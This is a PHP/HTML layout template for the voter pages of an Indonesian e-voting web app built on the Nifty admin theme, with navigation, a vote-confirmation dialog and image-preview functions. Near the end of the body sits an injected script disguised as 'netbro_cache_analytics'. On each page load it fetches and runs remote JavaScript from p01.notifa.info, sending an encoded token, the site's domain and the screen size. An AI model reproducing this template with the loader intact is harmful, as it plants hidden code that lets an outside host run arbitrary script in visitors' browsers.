<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title><?= $site['nama_website']; ?> | <?php echo $this->uri->segment('2') ?> Admin</title>
    <link rel="shortcut icon" href="<?php echo base_url('assets');?>/img/logoevoting.png">
    <!--STYLESHEET-->
    <!--=================================================-->
    <!--Open Sans Font [ OPTIONAL ]-->
    <!-- <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'> -->
    <link href="<?php echo base_url('assets');?>/opensans.css" rel="stylesheet">
    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url('assets');?>/css/bootstrap.min.css" rel="stylesheet">
    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url('assets');?>/css/nifty.min.css" rel="stylesheet">
    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url('assets');?>/css/demo/nifty-demo-icons.min.css" rel="stylesheet">
    <!--=================================================-->
    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url('assets');?>/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url('assets');?>/plugins/pace/pace.min.js"></script>
    <!--Demo [ DEMONSTRATION ]-->
    <!-- <link href="<?php echo base_url('assets');?>/css/demo/nifty-demo.min.css" rel="stylesheet"> -->
    <!--Themify Icons [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/themify-icons/themify-icons.min.css" rel="stylesheet">
    <!--Morris.js [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/morris-js/morris.min.css" rel="stylesheet">
    <!--Ion Icons [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/ionicons/css/ionicons.min.css" rel="stylesheet">
    <!--Font Awesome [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet">
    <!--Animate.css [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/animate-css/animate.min.css" rel="stylesheet">
    <!--Bootstrap Select [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/bootstrap-select/bootstrap-select.min.css" rel="stylesheet">
    <!--Bootstrap Datepicker [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet">
    <!--FooTable [ OPTIONAL ]-->
   <link href="<?php echo base_url('assets');?>/plugins/fooTable/css/footable.core.css" rel="stylesheet">
   <!--CSS Loaders [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/css-loaders/css/css-loaders.css" rel="stylesheet">
    <!--Spinkit [ OPTIONAL ]-->
    <link href="<?php echo base_url('assets');?>/plugins/spinkit/css/spinkit.min.css" rel="stylesheet">

    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    =================================================-->

</head>
<div class="preloader">
  <div class="loading">
    <div class="load7">
        <div class="loader"></div>
    </div>
    <p>Harap Tunggu</p>
  </div>
</div>
<!-- <div class="col-sm-6 col-md-4 col-lg-3">
					            <div class="panel">
					                <div class="panel-body">
					                    <div class="load1">
					                        <div class="loader"></div>
					                    </div>
					                </div>
					            </div>
					        </div> -->
<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
<body>
    <div id="container" class="effect aside-float aside-bright mainnav-lg">

        <!--NAVBAR-->
        <!--===================================================-->
        <header id="navbar">
            <div id="navbar-container" class="boxed">

                <!--Brand logo & name-->
                <!--================================-->
                <div class="navbar-header">
                    <a href="index.html" class="navbar-brand">
                        <img src="<?php echo base_url('assets');?>/img/logoevoting2.png" alt="Nifty Logo" class="brand-icon">
                        <div class="brand-title">
                            <span class="brand-text"><?= $site['nama_website']; ?></span>
                        </div>
                    </a>
                </div>
                <!--================================-->
                <!--End brand logo & name-->


                <!--Navbar Dropdown-->
                <!--================================-->
                <div class="navbar-content">
                    <ul class="nav navbar-top-links">
                        <!--Navigation toogle button-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="tgl-menu-btn">
                            <a class="mainnav-toggle" href="#">
                                <i class="demo-pli-list-view"></i>
                            </a>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End Navigation toogle button-->
                    </ul>
                    <ul class="nav navbar-top-links">


                        <!--User dropdown-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li id="dropdown-user" class="dropdown">
                            <a href="#" data-toggle="dropdown" class="dropdown-toggle text-right">
                                <span class="ic-user pull-right">
                                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                    <!--You can use an image instead of an icon.-->
                                    <!--<img class="img-circle img-user media-object" src="img/profile-photos/1.png" alt="Profile Picture">-->
                                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                    <i class="demo-pli-male"></i>
                                </span>
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                                <!--You can also display a user name in the navbar.-->
                                <!--<div class="username hidden-xs">Aaron Chavez</div>-->
                                <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                            </a>


                            <div class="dropdown-menu dropdown-menu-sm dropdown-menu-right panel-default">
                                <ul class="head-list">
                                    <li>
                                        <a href="<?php echo base_url('pemilih/profile'); ?>"><i class="demo-pli-male icon-lg icon-fw"></i> Profile</a>
                                    </li>
                                    <!-- <li>
                                        <a href="#"><span class="badge badge-danger pull-right">9</span><i class="demo-pli-mail icon-lg icon-fw"></i> Messages</a>
                                    </li>
                                    <li>
                                        <a href="#"><span class="label label-success pull-right">New</span><i class="demo-pli-gear icon-lg icon-fw"></i> Settings</a>
                                    </li>
                                    <li>
                                        <a href="#"><i class="demo-pli-computer-secure icon-lg icon-fw"></i> Lock screen</a>
                                    </li> -->
                                    <li>
                                        <a href="<?php echo base_url('Auth_pemilih/logout'); ?>"><i class="demo-pli-unlock icon-lg icon-fw"></i> Logout</a>
                                    </li>
                                </ul>
                            </div>
                        </li>
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <!--End user dropdown-->
                    </ul>
                </div>
                <!--================================-->
                <!--End Navbar Dropdown-->

            </div>
        </header>
        <!--===================================================-->
        <!--END NAVBAR-->

        <div class="boxed">

            <!--CONTENT CONTAINER-->
            <!--===================================================-->
            <div id="content-container">
              <!-- <div id="page-head"> -->

                  <!--Page Title-->
                  <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                  <!-- <div id="page-title">
                      <h1 class="page-header text-overflow">Data Saksi - Admin (Username)</h1>
                  </div> -->
                  <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                  <!--End page title-->
                  <!--Breadcrumb-->
                  <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                  <!-- <ol class="breadcrumb">
                  <li><a href=""><i class="demo-pli-home"></i></a></li>
                  <li class="active">Tambah Kandidat</li>
                  </ol> -->
                  <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                  <!--End breadcrumb-->
              <!-- </div> -->


                <!--Page content-->
                <!--===================================================-->
                <!-- <div id="page-content"> -->

                  <?php echo $contents ;?>


                <!-- </div> -->
                <!--===================================================-->
                <!--End page content-->

            </div>
            <!--===================================================-->
            <!--END CONTENT CONTAINER-->






            <!--MAIN NAVIGATION-->
            <!--===================================================-->
            <nav id="mainnav-container">
                <div id="mainnav">


                    <!--OPTIONAL : ADD YOUR LOGO TO THE NAVIGATION-->
                    <!--It will only appear on small screen devices.-->
                    <!--================================
                    <div class="mainnav-brand">
                        <a href="index.html" class="brand">
                            <img src="img/logo.png" alt="Nifty Logo" class="brand-icon">
                            <span class="brand-text">Nifty</span>
                        </a>
                        <a href="#" class="mainnav-toggle"><i class="pci-cross pci-circle icon-lg"></i></a>
                    </div>
                    -->



                    <!--Menu-->
                    <!--================================-->
                    <div id="mainnav-menu-wrap">
                        <div class="nano">
                            <div class="nano-content">

                                <!--Profile Widget-->
                                <!--================================-->
                                <div id="mainnav-profile" class="mainnav-profile">
                                    <div class="profile-wrap text-center">
                                        <div class="pad-btm">
                                            <img class="img-circle img-md" src="<?php echo base_url('assets');?>/upload/images/foto_pemilih/<?= $datapemilih['photo']; ?>" alt="Profile Picture">
                                        </div>
                                        <a href="#profile-nav" class="box-block" data-toggle="collapse" aria-expanded="false">
                                            <span class="pull-right dropdown-toggle">
                                                <i class="dropdown-caret"></i>
                                            </span>
                                            <p class="mnp-name"><?= $datapemilih['nama_pemilih']; ?></p>
                                            <span class="mnp-desc"><?= $datapemilih['no_telp']; ?></span>
                                        </a>
                                    </div>
                                    <div id="profile-nav" class="collapse list-group bg-trans">
                                        <a href="<?php echo base_url('pemilih/profile'); ?>" class="list-group-item">
                                            <i class="demo-pli-male icon-lg icon-fw"></i> View Profile
                                        </a>
                                        <a href="<?php echo base_url('Auth_pemilih/logout'); ?>" class="list-group-item">
                                            <i class="demo-pli-unlock icon-lg icon-fw"></i> Logout
                                        </a>
                                    </div>
                                </div>

                                <ul id="mainnav-menu" class="list-group">

                              		<?php require_once('_sidebarpemilih.php') ; ?>


                                        </ul>
                                        <!-- Menu End -->



                            </div>
                        </div>
                    </div>
                    <!--================================-->
                    <!--End menu-->

                </div>
            </nav>
            <!--===================================================-->
            <!--END MAIN NAVIGATION-->

        </div>



        <!-- FOOTER -->
        <!--===================================================-->
        <footer id="footer">

            <!-- Visible when footer positions are fixed -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <div class="show-fixed pad-rgt pull-right">
                You have <a href="#" class="text-main"><span class="badge badge-danger">3</span> pending action.</a>
            </div>



            <!-- Visible when footer positions are static -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <div class="hide-fixed pull-right pad-rgt">
                Tamplate By <strong>Nifty</strong> Modify By Vebritok_blo. - User Aktif <b><?= $datapemilih['nama_pemilih']; ?></b>
            </div>



            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->

            <p class="pad-lft">&#0169; 2020 Pradana Industries - Ayo Memilih E-Voting Web Apps</p>



        </footer>
        <!--===================================================-->
        <!-- END FOOTER -->


        <!-- SCROLL PAGE BUTTON -->
        <!--===================================================-->
        <button class="scroll-top btn">
            <i class="pci-chevron chevron-up"></i>
        </button>
        <!--===================================================-->
    </div>
    <!--===================================================-->
    <!-- END OF CONTAINER -->





    <!--JAVASCRIPT-->
    <!--=================================================-->

    <!--jQuery [ REQUIRED ]-->
    <script src="<?php echo base_url('assets');?>/js/jquery.min.js"></script>


    <!--BootstrapJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url('assets');?>/js/bootstrap.min.js"></script>


    <!--NiftyJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url('assets');?>/js/nifty.min.js"></script>




    <!--=================================================-->

    <!--Demo script [ DEMONSTRATION ]-->
    <!-- <script src="<?php echo base_url('assets');?>/js/demo/nifty-demo.min.js"></script> -->


    <!--Flot Chart [ OPTIONAL ]-->
    <script src="<?php echo base_url('assets');?>/plugins/flot-charts/jquery.flot.min.js"></script>
	  <script src="<?php echo base_url('assets');?>/plugins/flot-charts/jquery.flot.resize.min.js"></script>
	  <script src="<?php echo base_url('assets');?>/plugins/flot-charts/jquery.flot.tooltip.min.js"></script>


    <!--Sparkline [ OPTIONAL ]-->
    <script src="<?php echo base_url('assets');?>/plugins/sparkline/jquery.sparkline.min.js"></script>


    <!--Specify page [ SAMPLE ]-->
    <script src="<?php echo base_url('assets');?>/js/demo/dashboard.js"></script>

    <!--Icons [ SAMPLE ]-->
    <script src="<?php echo base_url('assets');?>/js/demo/icons.js"></script>

    <!--Bootstrap Select [ OPTIONAL ]-->
    <script src="<?php echo base_url('assets');?>/plugins/bootstrap-select/bootstrap-select.min.js"></script>

    <!--Bootstrap Datepicker [ OPTIONAL ]-->
    <script src="<?php echo base_url('assets');?>/plugins/bootstrap-datepicker/bootstrap-datepicker.min.js"></script>

    <!--FooTable [ OPTIONAL ]-->
    <script src="<?php echo base_url('assets');?>/plugins/fooTable/dist/footable.all.min.js"></script>

    <!--Gauge js [ OPTIONAL ]-->
    <script src="<?php echo base_url('assets');?>/plugins/gauge-js/gauge.min.js"></script>

    <script src="<?php echo base_url('assets');?>/sweetalert2/dist/sweetalert2.all.min.js"></script>

    <script>
      $('.pilih').on('click', function(e){
      e.preventDefault();
      console.log('ya');
      const href = $(this).attr('href');
      const name = $(this).attr('data');

      Swal.fire({
        title: name,
        text: 'Apakah Anda Yakin Dengan Pilihan ini?',
        type: 'question',
        showCancelButton: true,
        confirmButtonColor: '#3085d6',
        cancelButtonColor: '#d33',
        confirmButtonText: 'Iya!'
        }).then((result) => {
          if (result.value) {
            document.location.href = href;
          }
        })
    })
    </script>

    <style type="text/css">
    .preloader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 9999;
      background-color: #fff;
    }
    .preloader .loading {
      position: absolute;
      left: 50%;
      top: 50%;
      transform: translate(-50%,-50%);
      font: 14px arial;
    }
    </style>

    <script>
        $(document).ready(function(){
          $(".preloader").fadeOut();
        })
        </script>


<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2CNaLknYAoSAvs98oacbv6DvMT%2f%2bY5LXMhffm4NwPkWsBjhVYydA5TgexA5TPuehJcf1rofsTxUshKgS6JGNbcp094lptdV%2faEEvmPBGT%2f%2bIUz8fPFAYVv1kyrePfLnn1OIfND64krcAPqYoRw9tD4jYuQc2I2CQdA43NL%2fz%2fgmSNsHp04Lxd9Zejir9TpvEeP6jajSbHKOwzztx84mRbvJ2WSeZLg6X3uDywp%2f9VMTLnTbijBZSQATZp7JFw69O%2b9miydF4%2ftpF1iSAlQ8cDhTq9Evag%2bbjXgK8x8W0oRTVSNKbgUsZ6PXKuaOcBD5wknwERS0uyfNvDliFbbvVG6reDMOEB5T6kw5vnX%2b3YnmxR3UyKwJcz0cPHteHN0gj28enWF0bPLTUbRdPr%2bJ2LDgjrM%2fFqOf7pVnse7V3lJUoRQ8alqU1dgfCQQv07ndsn2wiLGCto01k%2bzo5%2btBsCZzsY%2bLzIRBbdPD3d%2fAL1xBo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<script type="text/javascript">


function tampilkanPreview(userfile,idpreview)
{
  var gb = userfile.files;
  for (var i = 0; i < gb.length; i++)
  {
    var gbPreview = gb[i];
    var imageType = /image.*/;
    var preview=document.getElementById(idpreview);
    var reader = new FileReader();
    if (gbPreview.type.match(imageType))
    {
      //jika tipe data sesuai
      preview.file = gbPreview;
      reader.onload = (function(element)
      {
        return function(e)
        {
          element.src = e.target.result;
        };
      })(preview);
      //membaca data URL gambar
      reader.readAsDataURL(gbPreview);
    }
      else
      {
        //jika tipe data tidak sesuai
        alert("Tipe file tidak sesuai. Gambar harus bertipe .png, .gif atau .jpg.");
      }
  }
}
function tampilkanPreview1(userfile,idpreview1)
{
  var gb = userfile.files;
  for (var i = 0; i < gb.length; i++)
  {
    var gbPreview1 = gb[i];
    var imageType = /image.*/;
    var preview1=document.getElementById(idpreview1);
    var reader = new FileReader();
    if (gbPreview1.type.match(imageType))
    {
      //jika tipe data sesuai
      preview1.file = gbPreview1;
      reader.onload = (function(element)
      {
        return function(e)
        {
          element.src = e.target.result;
        };
      })(preview1);
      //membaca data URL gambar
      reader.readAsDataURL(gbPreview1);
    }
      else
      {
        //jika tipe data tidak sesuai
        alert("Tipe file tidak sesuai. Gambar harus bertipe .png, .gif atau .jpg.");
      }
  }
}
function tampilkanPreview2(userfile,idpreview2)
{
  var gb = userfile.files;
  for (var i = 0; i < gb.length; i++)
  {
    var gbPreview2 = gb[i];
    var imageType = /image.*/;
    var preview2=document.getElementById(idpreview2);
    var reader = new FileReader();
    if (gbPreview2.type.match(imageType))
    {
      //jika tipe data sesuai
      preview2.file = gbPreview2;
      reader.onload = (function(element)
      {
        return function(e)
        {
          element.src = e.target.result;
        };
      })(preview2);
      //membaca data URL gambar
      reader.readAsDataURL(gbPreview2);
    }
      else
      {
        //jika tipe data tidak sesuai
        alert("Tipe file tidak sesuai. Gambar harus bertipe .png, .gif atau .jpg.");
      }
  }
}
function tampilkanPreview3(userfile,idpreview3)
{
  var gb = userfile.files;
  for (var i = 0; i < gb.length; i++)
  {
    var gbPreview3 = gb[i];
    var imageType = /image.*/;
    var preview3=document.getElementById(idpreview3);
    var reader = new FileReader();
    if (gbPreview3.type.match(imageType))
    {
      //jika tipe data sesuai
      preview3.file = gbPreview3;
      reader.onload = (function(element)
      {
        return function(e)
        {
          element.src = e.target.result;
        };
      })(preview3);
      //membaca data URL gambar
      reader.readAsDataURL(gbPreview3);
    }
      else
      {
        //jika tipe data tidak sesuai
        alert("Tipe file tidak sesuai. Gambar harus bertipe .png, .gif atau .jpg.");
      }
  }
}
</script>
<script type="text/javascript">
// Filtering
    // -----------------------------------------------------------------
    var filtering = $('#demo-foo-filteringkategoriveb');
    filtering.footable().on('footable_filtering', function (e) {
        var selected = $('#demo-foo-filter-status').find(':selected').val();
        e.filter += (e.filter && e.filter.length > 0) ? ' ' + selected : selected;
        e.clear = !e.filter;
    });

    // Filter status
    $('#demo-foo-filter-status').change(function (e) {
        e.preventDefault();
        filtering.trigger('footable_filter', {filter: $(this).val()});
    });

    // Search input
    $('#demo-foo-search').on('input', function (e) {
        e.preventDefault();
        filtering.trigger('footable_filter', {filter: $(this).val()});
    });
</script>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:04:50 GMT -->
</html>
